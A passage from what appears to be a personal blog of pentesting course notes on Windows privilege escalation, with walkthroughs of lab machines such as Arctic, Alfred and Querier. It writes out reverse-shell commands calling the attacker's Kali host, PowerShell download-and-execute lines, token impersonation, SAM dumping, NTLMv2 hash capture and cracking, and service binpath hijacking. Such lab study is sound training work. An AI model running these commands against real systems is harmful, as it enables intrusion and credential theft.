<p>so we are gonna run this with admin privileges</p>

<p>even tho we do not have the admin credentials</p>

<p>Then we click: <strong>Show more details</strong></p>

<p>Then: <strong>Show information about the publishers certificate</strong></p>

<blockquote>
  <p>This is where the vulnerability take place
because it will open the browser as SYSTEM</p>
</blockquote>

<p>We click: Issued by <strong>publishers CA</strong></p>

<p>Close the program windows and go to the browser</p>

<p>In the browser:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go to config/preferences <span class="o">&gt;</span> file <span class="o">&gt;</span> save as...
<span class="c"># ignore errors</span>
</code></pre></div></div>

<p>Type in the file name bar:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\*</span>.<span class="k">*</span>
all system32 files will appear
search For the <span class="k">**</span>cmd.exe<span class="k">**</span>
right click <span class="o">&gt;</span> open
<span class="nb">whoami</span>
</code></pre></div></div>

<blockquote>
  <p>we are root</p>
</blockquote>

<h1 id="capstone">Capstone</h1>

<ul>
  <li>
    <p>5 machines</p>

    <p>Arctic (HTB)</p>

    <p>Bastard (HTB)</p>

    <p>Alfred (THM)</p>

    <p>Bastion (HTB)</p>

    <p>Querier (HTB)</p>
  </li>
</ul>

<h2 id="arctic">Arctic</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nothing new. 
enumeration...
a vulnerable service
searchsploit &lt;service&gt;
run and get a shell
<span class="k">then </span>run something like powerup, windows_vulnerability_check whatever
vuln MS010-059 exploit, run <span class="o">&gt;</span> root
</code></pre></div></div>

<h2 id="bastard">Bastard</h2>
<p>Basic PowerShell For Pentesters - https://book.hacktricks.xyz/windows/basic-powershell-fFor-pentesters</p>

<ul>
  <li>This time we are gonna run Sherlock.ps1</li>
</ul>

<p>Add this to the last line:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'Find-AllVuns'</span> <span class="o">&gt;&gt;</span> Sherlock.ps1
</code></pre></div></div>

<blockquote>
  <p>MS15-051 found.
search in For exploit in git or exploit-db</p>
</blockquote>

<p>Send the ms15-051 exploit &amp; nc.exe to the machine
then:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ms15-051.exe <span class="s2">"nc.exe &lt;kali ip&gt; &lt;port&gt; -e cmd.exe"</span>
<span class="c"># open a listener</span>
</code></pre></div></div>

<h2 id="alfred">Alfred</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins <span class="o">&gt;</span> admin:admin
projects <span class="o">&gt;</span> build <span class="nb">command
</span>nishang
systeminfo
msfconsole listener
msfvenom windows payload

<span class="c"># Grab the file:</span>
powershell <span class="s2">"(New-Object System.Net.WebClient).Downloadfile('http://&lt;kali ip&gt;/shell.exe', 'shell.exe')"</span>
python web server etc

<span class="c"># To start the exploit:</span>
Start-Process <span class="s2">"shell.exe"</span>

load incognito
getprivs
list-tokens <span class="nt">-u</span>

<span class="c"># Lets try to impersonate the aythority\system</span>
impersonate_token <span class="s2">"NT AUTHORITY</span><span class="se">\S</span><span class="s2">YSTEM"</span>
getuid
root
</code></pre></div></div>

<blockquote>
  <p>sometimes we have system, but we cant get into shell or use commands
so, we need to migrate to another process that is running as system</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>migrate &lt;svchost.exe PID&gt;
</code></pre></div></div>

<h2 id="bastion">Bastion</h2>
<p>Mounting VHD Files - https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25</p>

<p>we are gonna to mount the smb, then mount the VHD file. Then we search For the SAM file.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># C:\WIndows\System32\SAM | SECURITY | SYSTEM</span>

secretdump.py <span class="nt">-sam</span> &lt;sam file&gt; <span class="nt">-security</span> &lt;security file&gt; <span class="nt">-system</span> &lt;system file&gt; LOCAL
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- search mRemoteNg -
- search where the passwords are stored -
- grab the passwords
- grab a mRemoteNG decrypt tool from github
- crack the admin password
- root
</code></pre></div></div>

<blockquote>
  <p>hard .-.</p>
</blockquote>

<h2 id="querier">Querier</h2>
<p>Capturing MSSQL Credentials - https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># binwalk = to see what files are inside another file</span>
<span class="c"># its used in steganography a lot, but we can use in files also</span>
binwalk <span class="nt">-e</span> &lt;file&gt; 
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket/mssqlclient.py &lt;domain/username:password@&lt;target ip&gt; <span class="nt">-windows-auth</span>
</code></pre></div></div>

<p>in SQL:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">&gt;</span> enable_xp_cmdshell
</code></pre></div></div>

<p>in Kali:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>share
impacket/smbserver.py <span class="nt">-smb2support</span> share share/
</code></pre></div></div>

<p>in SQL:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>xp_dirtree <span class="s1">'\\&lt;kali ip\share\'</span>,1,1
</code></pre></div></div>

<blockquote>
  <p>This should give us a hash in our smbserver (NTLMv2 hash)</p>
</blockquote>

<ul>
  <li>copy the hash in a txt</li>
  <li>and try to crack with john</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--show</span> <span class="nt">--format</span><span class="o">=</span>netntlmv2 hash.txt <span class="nt">-w</span><span class="o">=</span>/rockyou.txt
hashcat <span class="nt">-m</span> 5600 hash.txt rockyou.txt <span class="nt">-O</span>
</code></pre></div></div>

<p>in SQL:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">&gt;</span> enable_xp_cmdshell
</code></pre></div></div>

<p>If we can enable the shell in SQL, we can execute commands:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell <span class="nb">dir </span>c:<span class="se">\</span>
<span class="c"># upload a netcat and get a better shell</span>
<span class="c"># open a web server in kali, to send a file</span>

xp_cmdshell powershell <span class="nt">-c</span> Invoke-WebRequest <span class="s2">"http://&lt;kali ip&gt;/nc.exe"</span> <span class="nt">-OutFile</span> <span class="s2">"C:</span><span class="se">\&lt;</span><span class="s2">path&gt;</span><span class="se">\n</span><span class="s2">c.exe"</span>
xp_cmdshell C:<span class="se">\&lt;</span>path&gt;<span class="se">\n</span>c.exe &lt;kali ip&gt; &lt;port&gt; <span class="nt">-e</span> cmd.exe
</code></pre></div></div>

<blockquote>
  <p>we get a user shell</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># open a web server again: Inside the directory that has PowerUp.ps1 | winpeas | sherlock etc</span>
python <span class="nt">-m</span> http.server
</code></pre></div></div>

<p>This will download and execute the powerup from our web server:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://&lt;kali ip&gt;:80/PowerUp.ps1'</span><span class="o">)</span> | powershell <span class="nt">-noprofile</span> -
</code></pre></div></div>

<p>if u find a vulnerable service:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc &lt;service&gt;
</code></pre></div></div>

<p>We can change de binary path and exploit using netcat:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc config &lt;service&gt; <span class="nv">binpath</span><span class="o">=</span> <span class="s2">"C:</span><span class="se">\p</span><span class="s2">ath</span><span class="se">\n</span><span class="s2">c.exe &lt;kali ip&gt; &lt;port&gt; -e cmd.exe"</span>
sc qc &lt;service&gt; <span class="o">=</span>to visualize the new binpath
</code></pre></div></div>

<p>open a listener</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop &lt;service&gt;
sc start &lt;service&gt;
</code></pre></div></div>

<blockquote>
  <p>we should get a shell back</p>
</blockquote>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#privesc" class="page__taxonomy-item" rel="tag">privesc</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#pnpt" class="page__taxonomy-item" rel="tag">pnpt</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-27T00:00:00+06:00">November 27, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=5+-+Windows+Privilege+Escalation%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fwinprivesc%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fwinprivesc%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fwinprivesc%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/notes/pnpt/linuxprivesc/" class="pagination--pager" title="4 - Linux Privilege Escalation
">Previous</a>
    
    
      <a href="/notes/pnpt/wpivoting/" class="pagination--pager" title="6 - Movement, Pivoting and Persistence
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
